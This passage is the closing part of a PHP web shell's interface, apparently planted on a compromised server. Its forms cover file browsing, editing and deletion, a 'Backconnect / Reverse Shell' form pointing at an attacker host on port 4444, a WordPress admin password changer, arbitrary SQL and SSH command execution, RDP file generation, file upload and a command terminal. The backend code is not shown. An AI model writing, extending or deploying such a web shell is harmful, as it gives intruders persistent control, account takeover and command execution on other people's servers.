                      <button class="action-btn" style="background:linear-gradient(90deg,#ff6f88,#ff9fb4);margin-left:6px" onclick="return confirm('Delete folder <?=esc($f)?> and all contents?')">🗑</button>
                    </form>
                  <?php else: ?>
                    <a href="<?=esc($p)?>" download style="text-decoration:none"><button class="action-btn" type="button">⬇ DL</button></a>
                    <form method="POST" style="display:inline">
                      <input type="hidden" name="view_file" value="<?=esc($p)?>" />
                      <button class="action-btn" style="margin-left:6px">✏️ Edit</button>
                    </form>
                    <form method="POST" style="display:inline">
                      <input type="hidden" name="del_file" value="<?=esc($p)?>" />
                      <button class="action-btn" style="background:linear-gradient(90deg,#ff6f88,#ff9fb4);margin-left:6px" onclick="return confirm('Delete file <?=esc($f)?>?')">🗑</button>
                    </form>
                  <?php endif; ?>
                </td>
              </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
          <input type="hidden" id="bulkActionField" name="bulk_action" value="">
        </form>
      </div>
    </div>
  </div>
</div>

<!-- ==================== ADVANCED FEATURES POPUPS ==================== -->

<!-- Backconnect Popup -->
<?php if (isset($_GET['show_backconnect'])): ?>
<div class="popup-overlay" id="backconnectPopup">
  <div class="popup-content" style="width:600px">
    <div class="popup-header">
      <h4>🔗 Backconnect / Reverse Shell</h4>
      <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <div style="margin-bottom:20px">
        <h5 style="color:var(--neon-cyan);margin-top:0">Forward Connection</h5>
        <form method="POST">
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px">
            <div>
              <label style="font-size:12px;color:var(--muted)">Host/IP</label>
              <input type="text" name="backconnect_host" class="input" placeholder="your-server.com" required>
            </div>
            <div>
              <label style="font-size:12px;color:var(--muted)">Port</label>
              <input type="number" name="backconnect_port" class="input" placeholder="4444" value="4444" required>
            </div>
          </div>
          <button type="submit" class="btn-neon" style="width:100%">Start Backconnect</button>
        </form>
      </div>
      
      <div>
        <h5 style="color:var(--neon-cyan)">Reverse Shell</h5>
        <form method="POST">
          <div style="margin-bottom:10px">
            <label style="font-size:12px;color:var(--muted)">Listen Port</label>
            <input type="number" name="reverse_port" class="input" placeholder="4444" value="4444" required>
          </div>
          <button type="submit" class="btn-neon" style="width:100%;background:linear-gradient(90deg,#ff0000,#ff4444)">
            Start Reverse Shell (Listen)
          </button>
        </form>
      </div>
      
      <?php if(!empty($feature_result)): ?>
      <div class="feature-result">
        <?=nl2br(esc($feature_result))?>
      </div>
      <?php endif; ?>
    </div>
  </div>
</div>
<?php endif; ?>

<!-- WordPress Password Changer Popup -->
<?php if (isset($_GET['show_wp_password'])): ?>
<div class="popup-overlay" id="wpPasswordPopup">
  <div class="popup-content" style="width:600px">
    <div class="popup-header">
      <h4>🔑 WordPress Password Changer</h4>
      <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <form method="POST">
        <div style="margin-bottom:15px">
          <label style="font-size:12px;color:var(--muted)">WordPress Directory</label>
          <input type="text" name="wp_directory" class="input" placeholder="/var/www/html/wordpress" value="<?=esc($dir)?>" required>
        </div>
        
        <div style="margin-bottom:15px">
          <label style="font-size:12px;color:var(--muted)">New Admin Password</label>
          <input type="text" name="wp_new_password" class="input" placeholder="NewPassword123!" required>
        </div>
        
        <button type="submit" class="btn-neon" style="width:100%">
          Change WordPress Admin Password
        </button>
      </form>
      
      <?php if(!empty($feature_result)): ?>
      <div class="feature-result">
        <?=nl2br(esc($feature_result))?>
      </div>
      <?php endif; ?>
    </div>
  </div>
</div>
<?php endif; ?>

<!-- Database Manager Popup -->
<?php if (isset($_GET['show_database'])): ?>
<div class="popup-overlay" id="databasePopup">
  <div class="popup-content" style="width:800px">
    <div class="popup-header">
      <h4>🗃️ Database Manager</h4>
      <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <div style="margin-bottom:20px">
        <h5 style="color:var(--neon-cyan);margin-top:0">Database Connection</h5>
        <form method="POST">
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px">
            <div>
              <label style="font-size:12px;color:var(--muted)">Host</label>
              <input type="text" name="db_host" class="input" placeholder="localhost" value="localhost">
            </div>
            <div>
              <label style="font-size:12px;color:var(--muted)">Username</label>
              <input type="text" name="db_user" class="input" placeholder="root" value="root">
            </div>
            <div>
              <label style="font-size:12px;color:var(--muted)">Password</label>
              <input type="password" name="db_pass" class="input" placeholder="password">
            </div>
            <div>
              <label style="font-size:12px;color:var(--muted)">Database (Optional)</label>
              <input type="text" name="db_name" class="input" placeholder="database_name">
            </div>
          </div>
          <button type="submit" class="btn-neon" style="width:100%">Connect to Database</button>
        </form>
      </div>
      
      <div>
        <h5 style="color:var(--neon-cyan)">SQL Query</h5>
        <form method="POST">
          <div style="margin-bottom:10px">
            <label style="font-size:12px;color:var(--muted)">SQL Query</label>
            <textarea name="db_query" class="input" rows="4" placeholder="SHOW DATABASES; OR SELECT * FROM users;"></textarea>
          </div>
          <button type="submit" class="btn-neon" style="width:100%">Execute Query</button>
        </form>
      </div>
      
      <?php if(!empty($feature_result)): ?>
      <div class="feature-result">
        <?php 
        if(is_array($feature_result)) {
            echo "<table style='width:100%;font-size:11px;'>";
            if(count($feature_result) > 0) {
                echo "<tr>";
                foreach(array_keys($feature_result[0]) as $header) {
                    echo "<th style='padding:4px;border-bottom:1px solid #333'>$header</th>";
                }
                echo "</tr>";
                foreach($feature_result as $row) {
                    echo "<tr>";
                    foreach($row as $cell) {
                        echo "<td style='padding:4px;border-bottom:1px solid #222'>" . esc($cell) . "</td>";
                    }
                    echo "</tr>";
                }
            }
            echo "</table>";
        } else {
            echo nl2br(esc($feature_result));
        }
        ?>
      </div>
      <?php endif; ?>
    </div>
  </div>
</div>
<?php endif; ?>

<!-- SSH Manager Popup -->
<?php if (isset($_GET['show_ssh'])): ?>
<div class="popup-overlay" id="sshPopup">
  <div class="popup-content" style="width:800px">
    <div class="popup-header">
      <h4>🖥️ SSH Manager</h4>
      <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <div style="margin-bottom:20px">
        <h5 style="color:var(--neon-cyan);margin-top:0">SSH Connection</h5>
        <form method="POST">
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px">
            <div>
              <label style="font-size:12px;color:var(--muted)">Host</label>
              <input type="text" name="ssh_host" class="input" placeholder="192.168.1.1" required>
            </div>
            <div>
              <label style="font-size:12px;color:var(--muted)">Port</label>
              <input type="number" name="ssh_port" class="input" placeholder="22" value="22">
            </div>
            <div>
              <label style="font-size:12px;color:var(--muted)">Username</label>
              <input type="text" name="ssh_user" class="input" placeholder="root" required>
            </div>
            <div>
              <label style="font-size:12px;color:var(--muted)">Password</label>
              <input type="password" name="ssh_pass" class="input" placeholder="password" required>
            </div>
          </div>
          <button type="submit" class="btn-neon" style="width:100%">Connect SSH</button>
        </form>
      </div>
      
      <div>
        <h5 style="color:var(--neon-cyan)">SSH Command</h5>
        <form method="POST">
          <div style="margin-bottom:10px">
            <label style="font-size:12px;color:var(--muted)">Command to Execute</label>
            <input type="text" name="ssh_command" class="input" placeholder="ls -la OR uname -a" required>
          </div>
          <button type="submit" class="btn-neon" style="width:100%">Execute Command</button>
        </form>
      </div>
      
      <?php if(!empty($feature_result)): ?>
      <div class="feature-result">
        <?=nl2br(esc($feature_result))?>
      </div>
      <?php endif; ?>
    </div>
  </div>
</div>
<?php endif; ?>

<!-- RDP Manager Popup -->
<?php if (isset($_GET['show_rdp'])): ?>
<div class="popup-overlay" id="rdpPopup">
  <div class="popup-content" style="width:600px">
    <div class="popup-header">
      <h4>🖥️ RDP Connection Manager</h4>
      <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <form method="POST">
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px">
          <div>
            <label style="font-size:12px;color:var(--muted)">RDP Host</label>
            <input type="text" name="rdp_host" class="input" placeholder="192.168.1.100" required>
          </div>
          <div>
            <label style="font-size:12px;color:var(--muted)">Username</label>
            <input type="text" name="rdp_user" class="input" placeholder="Administrator" required>
          </div>
          <div>
            <label style="font-size:12px;color:var(--muted)">Password (Optional)</label>
            <input type="password" name="rdp_pass" class="input" placeholder="password">
          </div>
          <div>
            <label style="font-size:12px;color:var(--muted)">Filename</label>
            <input type="text" name="rdp_filename" class="input" placeholder="connection.rdp" value="connection.rdp">
          </div>
        </div>
        
        <button type="submit" class="btn-neon" style="width:100%">
          Generate RDP File
        </button>
      </form>
      
      <?php if(!empty($feature_result)): ?>
      <div class="feature-result">
        <?=nl2br(esc($feature_result))?>
      </div>
      <?php endif; ?>
      
      <div style="margin-top:20px;padding:15px;background:rgba(0,0,0,0.2);border-radius:8px">
        <h6 style="color:var(--neon-mag);margin-top:0">How to use:</h6>
        <ol style="margin:0;padding-left:20px;font-size:12px;color:var(--muted)">
          <li>Fill in RDP connection details</li>
          <li>Click "Generate RDP File"</li>
          <li>Download the generated .rdp file</li>
          <li>Double-click the .rdp file to connect</li>
          <li>Enter password when prompted (if not saved)</li>
        </ol>
      </div>
    </div>
  </div>
</div>
<?php endif; ?>

<!-- Other Existing Popups (File Upload, Terminal, etc.) -->
<?php if (isset($_GET['show_file_upload'])): ?>
<div class="popup-overlay" id="fileUploadPopup">
  <div class="popup-content" style="width:500px">
    <div class="popup-header">
      <h4>⬆️ Upload Files</h4>
      <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <form method="POST" enctype="multipart/form-data">
        <input type="file" name="upload[]" class="input" multiple required>
        <button type="submit" class="btn-neon" style="width:100%;margin-top:10px">Upload Files</button>
      </form>
    </div>
  </div>
</div>
<?php endif; ?>

<!-- Terminal Popup -->
<?php if (isset($_GET['show_terminal'])): ?>
<div class="popup-overlay" id="terminalPopup">
  <div class="popup-content" style="width:800px">
    <div class="popup-header">
      <h4>💻 Terminal</h4>
      <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <form method="POST">
        <div style="display:flex;gap:8px;margin-bottom:12px">
          <input type="text" name="terminal_cmd" class="input" placeholder="Enter command..." style="flex:1" autofocus>
          <button class="btn-neon" type="submit">Execute</button>
        </div>
      </form>
    </div>
  </div>
</div>
<?php endif; ?>

<script>
// Bulk Operations Functions
let selectedFiles = new Set();

function toggleAllSelection() {
    const checkboxes = document.querySelectorAll('.bulk-checkbox:not(.bulk-select-all)');
    const selectAll = document.getElementById('selectAll');
    const allChecked = selectAll.checked;
    
    checkboxes.forEach(cb => {
        cb.checked = allChecked;
        if(allChecked) selectedFiles.add(cb.value);
        else selectedFiles.delete(cb.value);
    });
    
    updateBulkSelection();
}

function updateBulkSelection() {
    const checkboxes = document.querySelectorAll('.bulk-checkbox:not(.bulk-select-all)');
    selectedFiles.clear();
    
    checkboxes.forEach(cb => {
        if(cb.checked) selectedFiles.add(cb.value);
    });
    
    const selectedCount = selectedFiles.size;
    const bulkBar = document.getElementById('bulkActionsBar');
    const countSpan = document.getElementById('selectedCount');
    const selectAll = document.getElementById('selectAll');
    
    if(selectedCount > 0) {
        bulkBar.style.display = 'flex';
        countSpan.textContent = selectedCount + ' selected';
        selectAll.checked = checkboxes.length === selectedCount;
    } else {
        bulkBar.style.display = 'none';
        selectAll.checked = false;
    }
}

function clearSelection() {
    const checkboxes = document.querySelectorAll('.bulk-checkbox');
    checkboxes.forEach(cb => cb.checked = false);
    selectedFiles.clear();
    updateBulkSelection();
}

function bulkAction(action) {
    if(selectedFiles.size === 0) {
        alert('Please select files first!');
        return;
    }
    
    if(action === 'delete' && !confirm(`Delete ${selectedFiles.size} selected item(s)?`)) return;
    if(action === 'zip' && !confirm(`Create ZIP archive of ${selectedFiles.size} file(s)?`)) return;
    
    document.getElementById('bulkActionField').value = action;
    document.getElementById('bulkForm').submit();
}

// Show feature result notifications
document.addEventListener('DOMContentLoaded', function() {
    updateBulkSelection();
    
    const featureResult = document.getElementById('featureResult');
    if(featureResult) {
        featureResult.style.display = 'block';
        setTimeout(() => {
            featureResult.style.display = 'none';
        }, 5000);
    }
});
</script>
</body>
</html>